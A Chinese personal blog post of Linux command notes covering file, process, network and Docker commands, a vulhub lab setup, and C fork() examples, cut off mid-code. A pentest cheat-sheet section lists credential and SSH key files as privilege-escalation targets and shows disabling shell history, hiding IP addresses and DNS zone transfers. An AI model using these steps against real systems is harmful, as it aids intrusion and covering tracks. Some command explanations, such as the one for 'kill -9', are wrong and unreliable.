
  </div>

  

  
  
  

  

</article>
    
    <article id="post-Linux" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/03/06/Linux/"
    >Linux</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/03/06/Linux/" class="article-date">
  <time datetime="2020-03-06T11:49:59.000Z" itemprop="datePublished">2020-03-06</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/Linux%E5%AD%A6%E4%B9%A0/">Linux学习</a>
  </div>

      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a><strong>Linux常用命令</strong></h2><p>有些命令学了老是忘，这里就记录一些自己常用的命令~</p>
<table>
<thead>
<tr>
<th align="left">常用查询命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>more -5 proxy.py</strong></td>
<td align="left"><strong>每5行为1页，按空格键切换下一页，回车键为下一行</strong></td>
</tr>
<tr>
<td align="left"><strong>ls -lha | more -5</strong></td>
<td align="left"><strong>按q即可退出</strong></td>
</tr>
<tr>
<td align="left"><strong>echo hello &gt; kail.txt</strong></td>
<td align="left"><strong>直接覆盖原本的内容</strong></td>
</tr>
<tr>
<td align="left"><strong>echo hello &gt;&gt;kail.txt</strong></td>
<td align="left"><strong>追加在原本的内容上</strong></td>
</tr>
<tr>
<td align="left"><strong>find  /root  -name  proxy.py</strong></td>
<td align="left"><strong>搜索root目录下，名为proxy.py的文件</strong></td>
</tr>
<tr>
<td align="left"><strong>find .  -ctime  -20</strong></td>
<td align="left"><strong>搜索当前目录下，最近20天内更新过的所有文件</strong></td>
</tr>
<tr>
<td align="left"><strong>find .  -cmin   -20</strong></td>
<td align="left"><strong>搜索当前目录下，最近20分钟内更新过的所有文件</strong></td>
</tr>
<tr>
<td align="left"><strong>find  .       -name    ‘  *.py  ‘     -a     -type f</strong></td>
<td align="left"><strong>注意加单引号表示转义</strong></td>
</tr>
<tr>
<td align="left"><strong>-a   表示  and  ，-o 表示or</strong></td>
<td align="left"><strong>type表示文件类型，f文件、d目录、l链接文件</strong></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">常用文件操作命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>mv proxy.py     ~/desktop/kaillinux/</strong></td>
<td align="left"><strong>移动文件到指定目录下，这是剪切</strong></td>
</tr>
<tr>
<td align="left"><strong>cp -r kaillinux/  ~</strong></td>
<td align="left"><strong>复制kaillinux到~目录下，注意需要加-r（mv可不加）</strong></td>
</tr>
<tr>
<td align="left"><strong>mv proxy.py ssh_proxy.py</strong></td>
<td align="left"><strong>重命名为ssh_proxy.py</strong></td>
</tr>
<tr>
<td align="left"><strong>cat -b xx.txt  /  cat -n xx.txt</strong></td>
<td align="left"><strong>显示行号 去除空行 /  显示行号 包含空行</strong></td>
</tr>
<tr>
<td align="left"><strong>ps -aux</strong></td>
<td align="left"><strong>显示所有包含其他使用者的行程</strong></td>
</tr>
<tr>
<td align="left"><strong>ps -ef</strong></td>
<td align="left"><strong>显示所有命令，连带命令行</strong></td>
</tr>
<tr>
<td align="left"><strong>ps -u root</strong></td>
<td align="left"><strong>显示 root 进程用户信息</strong></td>
</tr>
<tr>
<td align="left"><strong>ps aux  |  grep tcp</strong></td>
<td align="left"><strong>查找对应服务的进程</strong></td>
</tr>
<tr>
<td align="left"><strong>kill -9</strong></td>
<td align="left"><strong>找到对应的PID以后，杀死id为9的进程，kill只能杀死单进程</strong></td>
</tr>
<tr>
<td align="left"><strong>pkill -9  httpd</strong></td>
<td align="left"><strong>pkill和killall可杀死多个进程，直接杀死程序(httpd为程序名)</strong></td>
</tr>
</tbody></table>
<hr>
<h2 id="操作系统信息收集"><a href="#操作系统信息收集" class="headerlink" title="操作系统信息收集"></a>操作系统信息收集</h2><table>
<thead>
<tr>
<th>本地信息查看命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>whoami</strong></td>
<td><strong>显示 Linux 上当前已登录用户。</strong></td>
</tr>
<tr>
<td><strong>id</strong></td>
<td><strong>向用户显示当前已登录的用户和组。</strong></td>
</tr>
<tr>
<td><strong>last</strong></td>
<td><strong>显示最后一次登陆的用户。</strong></td>
</tr>
<tr>
<td><strong>mount</strong></td>
<td><strong>显示已挂载的驱动。</strong></td>
</tr>
<tr>
<td><strong>df -h</strong></td>
<td><strong>用人类可读的输出显示磁盘使用情况。</strong></td>
</tr>
<tr>
<td><strong>echo “user:passwd” | chpasswd</strong></td>
<td><strong>用一行命令重置密码。</strong></td>
</tr>
<tr>
<td><strong>getent passwd</strong></td>
<td><strong>列出 Linux 上的用户。</strong></td>
</tr>
<tr>
<td><strong>strings /usr/local/bin/blah</strong></td>
<td><strong>显示非文本文件的内容，例如：一个二进制文件里面有什么。</strong></td>
</tr>
<tr>
<td><strong>uname -ar</strong></td>
<td><strong>显示运行中的内核版本。</strong></td>
</tr>
<tr>
<td><strong>PATH=$PATH:/my/new-path</strong></td>
<td><strong>添加一个新的路径，方便进行本地文件系统（FS）操作。</strong></td>
</tr>
<tr>
<td><strong>history</strong></td>
<td><strong>显示用户在之前执行的 bash 脚本历史记录，还有敲入的命令。</strong></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>常见操作命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>netstat -tulpn</strong></td>
<td><strong>在 Linux 中显示对应了进程ID（PID）的网络端口。</strong></td>
</tr>
<tr>
<td><strong>watch ss -stplu</strong></td>
<td><strong>通过套接字实时观察 TCP, UDP 端口。</strong></td>
</tr>
<tr>
<td><strong>lsof -i</strong></td>
<td><strong>显示确认了的连接。</strong></td>
</tr>
<tr>
<td><strong>macchanger -m MACADDR INTR</strong></td>
<td><strong>在 KALI Linux 上修改 MAC 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0 192.168.2.1/24</strong></td>
<td><strong>在 Linux 中设置 ID 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0:1 192.168.2.3/24</strong></td>
<td><strong>在 Linux 中向现有的网络接口添加 IP 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0 hw ether MACADDR</strong></td>
<td><strong>使用 ifconfig 修改 Linux 中的 MAC 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0 mtu 1500</strong></td>
<td><strong>在 Linux 中使用 ifconfig 修改 MTU 的大小，将 1500 改为你想要的 MTU。</strong></td>
</tr>
<tr>
<td><strong>dig -x 192.168.1.1</strong></td>
<td><strong>对 IP 地址进行反向查找。</strong></td>
</tr>
<tr>
<td><strong>host 192.168.1.1</strong></td>
<td><strong>在一个 IP 地址上进行反向查找，适用于没有安装 dig 的情况。</strong></td>
</tr>
<tr>
<td><strong>dig @192.168.2.2 domain.com -t AXFR</strong></td>
<td><strong>使用 dig 执行一次 DNS 区域传输。</strong></td>
</tr>
<tr>
<td><strong>host -l domain.com nameserver</strong></td>
<td><strong>使用 host 执行一次 DNS 区域传输。</strong></td>
</tr>
<tr>
<td><strong>nbtstat -A x.x.x.x</strong></td>
<td><strong>获取 IP 地址对应的域名。</strong></td>
</tr>
<tr>
<td><strong>ip addr add 192.168.2.22/24 dev eth0</strong></td>
<td><strong>向 Linux 添加一个隐藏的 IP 地址，在执行 ifconfig 命令时不会显示这个 IP 地址。</strong></td>
</tr>
<tr>
<td><strong>tcpkill -9 host google.com</strong></td>
<td><strong>阻止从主机访问 google.com。</strong></td>
</tr>
<tr>
<td><strong>echo “1” &gt; /proc/sys/net/ipv4/ip_forward</strong></td>
<td><strong>启用 IP 转发，将 Linux 盒子变成一个路由器——这样就方便通过这个盒子来进行路由流量的控制。</strong></td>
</tr>
<tr>
<td><strong>echo “8.8.8.8” &gt; /etc/resolv.conf</strong></td>
<td><strong>使用 Google 的 DNS。</strong></td>
</tr>
</tbody></table>
<p><strong>查看服务器版本：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*<span class="literal">-release</span></span><br><span class="line">cat /etc/lsb<span class="literal">-release</span> <span class="comment"># 基于 Debian</span></span><br><span class="line">cat /etc/redhat<span class="literal">-release</span> <span class="comment"># 基于 Redhat</span></span><br></pre></td></tr></table></figure>

<p><strong>查看内核的版本信息？</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>







<h4 id><a href="#" class="headerlink" title></a></h4><p><strong>基于 Redhat / CentOS / RPM 的发行版</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>cat /etc/redhat-release</td>
<td>显示 Redhat / CentOS 版本号。</td>
</tr>
<tr>
<td>rpm -qa</td>
<td>在基于 RPM 的 Linux 上列出所有已经安装上的 RPM 包。</td>
</tr>
<tr>
<td>rpm -q –changelog openvpn</td>
<td>检查已安装的 RPM 是否针对 CVE 打了补丁，可以用 grep 命令过滤出跟 CVE 有关的输出。LeoXu</td>
</tr>
</tbody></table>
<p><strong>基于 Debian / Ubuntu / .deb 的发行版</strong> </p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>cat /etc/debian_version</td>
<td>显示 Debian 版本号。</td>
</tr>
<tr>
<td>cat /etc/*-release</td>
<td>显示 Ubuntu 版本号。</td>
</tr>
<tr>
<td>dpkg -l</td>
<td>在基于 Debian / .deb 的 Linux 发行版上列出所有已安装的包。</td>
</tr>
</tbody></table>
<h2 id="Linux-用户管理"><a href="#Linux-用户管理" class="headerlink" title="Linux 用户管理"></a><strong>Linux 用户管理</strong></h2><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>useradd new-user</td>
<td>创建一个新的 Linux 用户。</td>
</tr>
<tr>
<td>passwd username</td>
<td>重置 Linux 用户密码, 如果你是 root 用户，只要输入密码就行了。</td>
</tr>
<tr>
<td>deluser username</td>
<td>删除一个 Linux 用户。</td>
</tr>
</tbody></table>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h2 id="Linux-解压缩命令"><a href="#Linux-解压缩命令" class="headerlink" title="Linux 解压缩命令"></a><strong>Linux 解压缩命令</strong></h2><p>如何在 Linux 上解析不同的压缩包 (tar, zip, gzip, bzip2 等等) ，以及其它的一些用来在压缩包中进行搜索等操作的小技巧。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>unzip archive.zip</td>
<td>在 Linux 上提取 zip 包中的文件。</td>
</tr>
<tr>
<td>zipgrep *.txt archive.zip</td>
<td>在一个 zip 压缩包中搜索。</td>
</tr>
<tr>
<td>tar xf archive.tar</td>
<td>在 Linux 上提取 tar 包中的文件。</td>
</tr>
<tr>
<td>tar xvzf archive.tar.gz</td>
<td>在 Linux 上提取 tar.gz 包中的文件。</td>
</tr>
<tr>
<td>tar xjf archive.tar.bz2</td>
<td>在 Linux 上提取 tar.bz2 包中的文件。</td>
</tr>
<tr>
<td>tar ztvf file.tar.gz | grep blah</td>
<td>在一个 tar.gz 文件中搜索。</td>
</tr>
<tr>
<td>gzip -d archive.gz</td>
<td>在 Linux 上提取 gzip 中的文件。</td>
</tr>
<tr>
<td>zcat archive.gz</td>
<td>在 Linux 以不解压缩的方式读取一个 gz 文件。</td>
</tr>
<tr>
<td>zless archive.gz</td>
<td>用较少的命令实现对 .gz 压缩包相同的功能。</td>
</tr>
<tr>
<td>zgrep ‘blah’ /var/log/maillog*.gz</td>
<td>在 Linux 上对 .gz 压缩包里面的内容执行搜索，比如搜索被压缩过的日志文件。</td>
</tr>
<tr>
<td>vim file.txt.gz</td>
<td>使用 vim 读取 .txt.gz 文件（我个人的最爱）。</td>
</tr>
<tr>
<td>upx -9 -o output.exe input.exe</td>
<td>在 Linux 上使用 UPX 压缩 .exe 文件。</td>
</tr>
</tbody></table>
<h2 id="Linux-压缩命令"><a href="#Linux-压缩命令" class="headerlink" title="Linux 压缩命令"></a><strong>Linux 压缩命令</strong></h2><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>zip -r file.zip /dir/*</td>
<td>在 Linux 上创建一个 .zip 文件。</td>
</tr>
<tr>
<td>tar cf archive.tar files</td>
<td>在 Linux 上创建一个 tar 文件。</td>
</tr>
<tr>
<td>tar czf archive.tar.gz files</td>
<td>在 Linux 上创建一个 tar.gz 文件。</td>
</tr>
<tr>
<td>tar cjf archive.tar.bz2 files</td>
<td>在 Linux 上创建一个 tar.bz2 文件。</td>
</tr>
<tr>
<td>gzip file</td>
<td>在 Linux 上创建一个 .gz 文件。</td>
</tr>
</tbody></table>
<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h2 id="Linux-文件命令"><a href="#Linux-文件命令" class="headerlink" title="Linux 文件命令"></a><strong>Linux 文件命令</strong></h2><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>df -h blah</td>
<td>在 Linux 上显示文件/目录的大小。</td>
</tr>
<tr>
<td>diff file1 file2</td>
<td>在 Linux 上比对/显示两个文件之间的差别。</td>
</tr>
<tr>
<td>md5sum file</td>
<td>在 Linux 上生成 MD5 摘要。</td>
</tr>
<tr>
<td>md5sum -c blah.iso.md5</td>
<td>在 Linux 上检查文件的 MD5 摘要，这里假设文件和 .md5 处在相同的路径下。</td>
</tr>
<tr>
<td>file blah</td>
<td>在 Linux 上查找出文件的类型，也会将文件是 32 还是 64 位显示出来。</td>
</tr>
<tr>
<td>dos2unix</td>
<td>将 Windows 的行结束符转成 Unix/Linux 的。</td>
</tr>
<tr>
<td>base64 &lt; input-file &gt; output-file</td>
<td>对输入文件进行 Base64 编码，然后输出一个叫做 output-file 的 Base64 编码文件。</td>
</tr>
<tr>
<td>base64 -d &lt; input-file &gt; output-file</td>
<td>对输入文件进行 Base64 解码，然后输出一个叫做 output-file 的 Base64 解码文件。</td>
</tr>
<tr>
<td>touch -r ref-file new-file</td>
<td>使用来自于引用文件的时间戳数据创建一个新文件，放上 -r 以简单地创建一个文件。</td>
</tr>
<tr>
<td>rm -rf</td>
<td>不显示确认提示就删除文件和目录。</td>
</tr>
</tbody></table>
<h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h3 id="Misc-命令"><a href="#Misc-命令" class="headerlink" title="Misc 命令"></a>Misc 命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>init 6</td>
<td>从命令行重启 Linux 。</td>
</tr>
<tr>
<td>gcc -o output.c input.c</td>
<td>编译 C 代码。</td>
</tr>
<tr>
<td>gcc -m32 -o output.c input.c</td>
<td>交叉编译 C 代码，在 64 位 Linux 上将编译出 32 位的二进制文件。</td>
</tr>
<tr>
<td>unset HISTORYFILE</td>
<td>关闭 bash 历史日志记录功能。</td>
</tr>
<tr>
<td>rdesktop X.X.X.X</td>
<td>从 Linux 连接到 RDP 服务器。</td>
</tr>
<tr>
<td>kill -9 $$</td>
<td>关掉当前的会话。</td>
</tr>
<tr>
<td>chown user:group blah</td>
<td>修改文件或者目录的所有者。</td>
</tr>
<tr>
<td>chown -R user:group blah</td>
<td>修改文件或者目录，以及目录下面文件/目录的拥有者 —— 递归执行 chown。</td>
</tr>
<tr>
<td>chmod 600 file</td>
<td>修改文件/目录的权限设定, 详情见 <a href="#linux-file-system-permissions">Linux 文件系统权限</a> 。</td>
</tr>
</tbody></table>
<h3 id="Linux-文件系统权限"><a href="#Linux-文件系统权限" class="headerlink" title="Linux 文件系统权限"></a>Linux 文件系统权限</h3><table>
<thead>
<tr>
<th>取值</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>777</td>
<td>rwxrwxrwx 没有限制，完全可读可写可执行（RWX），用户可以做任何事情。</td>
</tr>
<tr>
<td>755</td>
<td>rwxr-xr-x 拥有者可完全访问，其他人只能读取和执行文件。</td>
</tr>
<tr>
<td>700</td>
<td>rwx—— 拥有者可完全访问，其他人都不能访问。</td>
</tr>
<tr>
<td>666</td>
<td>rw-rw-rw- 所有人可以读取和写入，但不可执行。</td>
</tr>
<tr>
<td>644</td>
<td>rw-r–r– 拥有者可以读取和写入，其他人只可以读取。</td>
</tr>
<tr>
<td>600</td>
<td>rw——- 拥有者可以读取和写入，其他人都不能访问。</td>
</tr>
</tbody></table>
<h3 id="-4"><a href="#-4" class="headerlink" title></a></h3><h3 id="Linux-文件系统的渗透测试备忘录"><a href="#Linux-文件系统的渗透测试备忘录" class="headerlink" title="Linux 文件系统的渗透测试备忘录"></a>Linux 文件系统的渗透测试备忘录</h3><table>
<thead>
<tr>
<th>目录</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>/</td>
<td>/ 也被称为“斜杠”或者根。</td>
</tr>
<tr>
<td>/bin</td>
<td>由系统、系统管理员以及用户共享的通用程序。</td>
</tr>
<tr>
<td>/boot</td>
<td>Boot 文件, 启动加载器(grub), 内核, vmlinuz</td>
</tr>
<tr>
<td>/dev</td>
<td>包含了对系统设备、带有特殊属性的文件的引用。</td>
</tr>
<tr>
<td>/etc</td>
<td>重要的系统配置文件。</td>
</tr>
<tr>
<td>/home</td>
<td>系统用户的主目录。</td>
</tr>
<tr>
<td>/lib</td>
<td>库文件，包括系统和用户都需要的所有类型的程序的文件。</td>
</tr>
<tr>
<td>/lost+found</td>
<td>文件操作失败会被保存在这里。</td>
</tr>
<tr>
<td>/mnt</td>
<td>外部文件系统的标准挂载点。</td>
</tr>
<tr>
<td>/media</td>
<td>外部文件系统（或者某些发行版）的挂载点。</td>
</tr>
<tr>
<td>/net</td>
<td>整个远程文件系统的标准挂载点 —— nfs。</td>
</tr>
<tr>
<td>/opt</td>
<td>一般都是包含一些附加的或者第三方软件。</td>
</tr>
<tr>
<td>/proc</td>
<td>一个包含了系统资源相关信息的虚拟文件系统。</td>
</tr>
<tr>
<td>/root</td>
<td>root 用户的主目录。</td>
</tr>
<tr>
<td>/sbin</td>
<td>由系统和系统管理员来使用的程序。</td>
</tr>
<tr>
<td>/tmp</td>
<td>供系统使用的临时空间，重启时会被清空。</td>
</tr>
<tr>
<td>/usr</td>
<td>供所有用户相关程序使用的程序、库、文档等等。</td>
</tr>
<tr>
<td>/var</td>
<td>存储所有由用户创建的可变文件和临时文件，比如日志文件、邮件队列、后台打印程序，Web服务器，数据库等等。</td>
</tr>
</tbody></table>
<h3 id="-5"><a href="#-5" class="headerlink" title></a></h3><h3 id="Linux-中有趣的文件-目录"><a href="#Linux-中有趣的文件-目录" class="headerlink" title="Linux 中有趣的文件/目录"></a>Linux 中有趣的文件/目录</h3><p>如果你想尝试进行特权升级/执行后期开发，这些都是你值得一瞧的命令。</p>
<table>
<thead>
<tr>
<th>路径</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>/etc/passwd</td>
<td>包含了本地 Linux 的用户。</td>
</tr>
<tr>
<td>/etc/shadow</td>
<td>包含了哈希过的本地账户密码。</td>
</tr>
<tr>
<td>/etc/group</td>
<td>包含了本地账户分组。</td>
</tr>
<tr>
<td>/etc/init.d/</td>
<td>包含了服务网初始化脚本 – 具体都安装了些啥应该值得一瞧。</td>
</tr>
<tr>
<td>/etc/hostname</td>
<td>系统的 hostname。</td>
</tr>
<tr>
<td>/etc/network/interfaces</td>
<td>网络接口。</td>
</tr>
<tr>
<td>/etc/resolv.conf</td>
<td>系统的 DNS 服务。</td>
</tr>
<tr>
<td>/etc/profile</td>
<td>系统的环境变量。</td>
</tr>
<tr>
<td>~/.ssh/</td>
<td>SSH 密钥。</td>
</tr>
<tr>
<td>~/.bash_history</td>
<td>用户的 bash 历史日志。</td>
</tr>
<tr>
<td>/var/log/</td>
<td>Linux 系统的日志文件一般就被存放在这里。</td>
</tr>
<tr>
<td>/var/adm/</td>
<td>UNIX 系统的日志文件一般就被存在在这里。</td>
</tr>
<tr>
<td>/var/log/apache2/access.log/var/log/httpd/access.log</td>
<td>Apache 访问日志文件通常的存在路径。</td>
</tr>
<tr>
<td>/etc/fstab</td>
<td>挂载的文件系统。</td>
</tr>
</tbody></table>
<hr>
<h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a><strong>docker常用命令</strong></h2><p>1 <strong>docker images</strong> 查看镜像信息列表 镜像是静态的</p>
<p>2 <strong>docker ps -a</strong> 查看运行中的所有容器</p>
<p>3 <strong>docker search [images]:[version]</strong>从dockerhub查询指定镜像</p>
<p>4 <strong>docker pull [images]:[version]</strong>从dockerhub拉取指定镜像</p>
<p>4 <strong>docker run -p 8000:80 -tdi  [imageID]</strong> 后台启动docker,并指定宿主机端口和docker映射端口。</p>
<p> <strong>-i:</strong>以交互模式运行容器，通常与 -t 同时使用；</p>
<p> <strong>-d:</strong>后台运行容器，并返回容器ID；</p>
<p><strong>-t:</strong>为容器重新分配一个伪输入终端，通常与 -i 同时使用；</p>
<p>5 当镜像通过run 启动后，便会载入到一个动态的container(容器)中运行，此时若需要进入终端交互模式：</p>
<p><strong>sudo docker exec -it [containerID] /bin/bash</strong></p>
<p>交互模式中，使用 ctrl+p+q退出交互 保持运行,使用 exit命令退出并停止容器。</p>
<p>6 在容器非交互模式下，通过docker start/stop 命令来启动/停止已部署的容器服务。</p>
<p>7 <strong>docker rm [containerID]</strong> 删除容器</p>
<p>8 <strong>docker rmi [imageID]</strong> 删除镜像</p>
<p>9 <strong>docker cp [YourHostFilePath] [containerID]:[DockerPath]</strong> 将宿主机内的指定文件传输至容器内部的指定地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br><span class="line">cd &#x2F;vulhub&#x2F;activemq&#x2F;CVE-2015-5254</span><br><span class="line">docker-compose up -d  #构建漏洞环境，这个命令包括了docker-compose build</span><br></pre></td></tr></table></figure>

<p>环境关闭</p>
<p><strong>docker-compose down</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p root</span><br></pre></td></tr></table></figure>

<h2 id="Deb包的安装"><a href="#Deb包的安装" class="headerlink" title="Deb包的安装"></a><strong>Deb包的安装</strong></h2><p>dpkg 是Debian package的简写，为”Debian“ 操作系统 专门开发的套件管理系统，用于软件的安装，更新和移除。</p>
<p>所有源自”Debian”的Linux的发行版都使用 dpkg,  例如”Ubuntu”</p>
<p><strong>实例:dpkg -i ~/Download/mozybackup_i386.deb</strong></p>
<p>命令:dpkg -L package</p>
<p><strong>安装完包后，可以用此命令查看软件安装到什么地方</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>dpkg -r  package</strong></td>
<td><strong>移除软件，保留配置</strong></td>
</tr>
<tr>
<td><strong>dpkg -P package</strong></td>
<td><strong>移除软件，不保留配值</strong></td>
</tr>
</tbody></table>
<hr>
<h2 id="进程控制编程"><a href="#进程控制编程" class="headerlink" title="进程控制编程"></a><strong>进程控制编程</strong></h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a><strong>fork()</strong></h3><p><strong>getpid / getppid</strong> </p>
<p><strong>getpid:得到当前进程的PID</strong></p>
<p><strong>getppid:得到当前进程的父进程的PID</strong></p>
<p><strong>fork实例代码如下：</strong></p>
<p><strong>父子进程的执行顺序—-不一定，谁抢到cpu谁执行</strong></p>
<p><strong>父进程会生成 n(n+1)/2+1个子进程,N 为循环次数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"--------i = %d\n"</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	pid = fork(); <span class="comment">//从此开始生成子进程，父子都会从此返回，根据返回值区分父子进程</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123; <span class="comment">//父进程返回子进程的PID</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;  <span class="comment">//子进程返回0</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d \n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"i = %d\n"</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行结果如下：</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./fork</span><br><span class="line">--------i = 0</span><br><span class="line">--------i = 1</span><br><span class="line">--------i = 2</span><br><span class="line">--------i = 3</span><br><span class="line">I'm parent pid = 10345, parentID = 1426</span><br><span class="line">i = 0</span><br><span class="line">i = 1</span><br><span class="line">i = 2</span><br><span class="line">i = 3</span><br><span class="line">child  pid = 10346, parentID=10345 </span><br><span class="line">i = 0</span><br><span class="line">i = 1</span><br><span class="line">i = 2</span><br><span class="line">i = 3</span><br></pre></td></tr></table></figure>



<p><strong>父进程子进程是单独执行的，但2者会共享文件</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, n = <span 